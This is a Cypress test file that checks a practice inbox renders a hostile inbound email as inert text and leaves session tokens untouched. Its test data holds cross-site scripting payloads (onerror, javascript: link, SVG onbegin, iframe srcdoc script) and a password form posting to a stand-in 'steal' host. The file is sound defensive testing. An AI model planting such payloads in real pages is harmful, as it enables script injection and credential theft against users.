/// <reference types="cypress" />
import '../support/e2e';
import { cleanPaWorld, paWorld, seedPaWorld } from '../support/paWorld';

/**
 * PA-08-3 (written, not run): an inbound email holding script, handlers, a javascript: link, an iframe and a form
 * is shown in the inbox thread as text only. Nothing runs and the signed-in staff member's tokens are untouched.
 * Gmail is never called: the inbox's Gmail endpoints are intercepted and answer with the hostile message.
 * Run: CYPRESS_PA_DB=<test db> npx cypress run --spec cypress/e2e/platform-auth-pa-08-email-html.cy.ts
 */
const MAILBOX = 'info@vetatyourdoor.com';
const THREAD_ID = 'pa08-thread-1';
const HOSTILE = [
  '<p>PA-08 hostile message body</p>',
  '<img src=x onerror=window.__xss=1>',
  '<a href="javascript:window.__xss=1">click here</a>',
  '<svg><animate onbegin=window.__xss=1 attributeName=x dur=1s></animate></svg>',
  '<iframe srcdoc="<script>window.__xss=1</script>"></iframe>',
  '<form action="https://evil.example.com/steal"><input name="pw"><button>Go</button></form>',
].join('');

const summary = {
  id: 'pa08-msg-1',
  threadId: THREAD_ID,
  snippet: 'PA-08 hostile message body',
  from: { name: 'Hostile Sender', email: 'hostile@example.com' },
  to: [{ name: 'Practice', email: MAILBOX }],
  subject: 'PA-08 hostile email',
  date: new Date().toISOString(),
  isUnread: false,
  isStarred: false,
  labelIds: ['INBOX'],
  hasAttachments: false,
};

const threadMessage = {
  ...summary,
  headers: {
    from: 'Hostile Sender <hostile@example.com>',
    to: MAILBOX,
    cc: '',
    subject: 'PA-08 hostile email',
    messageId: '<pa08-msg-1@example.com>',
    references: '',
    inReplyTo: '',
  },
  body: { html: HOSTILE, text: null },
  tracking: null,
};

function stubInbox() {
  cy.intercept('GET', '**/gmail/access*', { allowed: true });
  cy.intercept('GET', '**/gmail/mailboxes*', {
    mailboxes: [{ email: MAILBOX, kind: 'shared', connected: true, authMode: 'service_account' }],
  });
  cy.intercept('GET', '**/gmail/labels*', { labels: [] });
  cy.intercept('GET', '**/gmail/send-as*', { aliases: [] });
  cy.intercept('GET', '**/gmail/messages*', {
    labelId: 'INBOX',
    threads: [summary],
    untaggedQueue: [],
    nextPageToken: null,
    resultSizeEstimate: 1,
  }).as('messages');
  cy.intercept('GET', `**/gmail/threads/${THREAD_ID}*`, {
    id: THREAD_ID,
    messages: [threadMessage],
  }).as('thread');
}

describe('PA-08: email HTML in the inbox', () => {
  before(() => {
    seedPaWorld();
  });
  after(() => {
    cleanPaWorld();
  });

  it('PA-08-3 inbox screen to DOM: hostile email shows as text, nothing runs, tokens unchanged', () => {
    const w = paWorld();
    stubInbox();

    cy.visit('/login');
    cy.get('input[type="email"]', { timeout: 15000 }).should('be.visible').clear().type(w.staff.email);
    cy.get('input[type="password"]').should('be.visible').clear().type(w.staff.password, { log: false });
    cy.get('button[type="submit"]').should('not.be.disabled').click();
    cy.location('pathname', { timeout: 30000 }).should('not.include', '/login');

    cy.window().then((win) => {
      const before = {
        accessToken: win.localStorage.getItem('accessToken'),
        refreshToken: win.localStorage.getItem('refreshToken'),
      };
      expect(before.accessToken, 'signed in').to.be.a('string');

      cy.visit(`/schedule/email?mailbox=${encodeURIComponent(MAILBOX)}&thread=${THREAD_ID}`);
      cy.wait('@thread', { timeout: 30000 });

      cy.contains('.gmail-thread-message__body--html', 'PA-08 hostile message body', { timeout: 20000 })
        .should('be.visible')
        .then(($body) => {
          const body = $body[0];
          expect(body.querySelector('iframe, form, input, script, base, [srcdoc]'), 'no iframe/form/script').to.equal(null);
          for (const el of Array.from(body.querySelectorAll('*'))) {
            for (const attr of Array.from(el.attributes)) {
              expect(attr.name.toLowerCase().startsWith('on'), `${el.tagName} ${attr.name}`).to.equal(false);
              expect(attr.value, `${el.tagName} ${attr.name}`).not.to.match(/^\s*javascript:/i);
            }
          }
        });

      // Let any image error or SVG animation fire before checking.
      cy.wait(1000);
      cy.window().then((after) => {
        expect((after as unknown as { __xss?: unknown }).__xss, 'window.__xss').to.equal(undefined);
        expect(after.localStorage.getItem('accessToken'), 'access token').to.equal(before.accessToken);
        expect(after.localStorage.getItem('refreshToken'), 'refresh token').to.equal(before.refreshToken);
      });
    });
  });
});
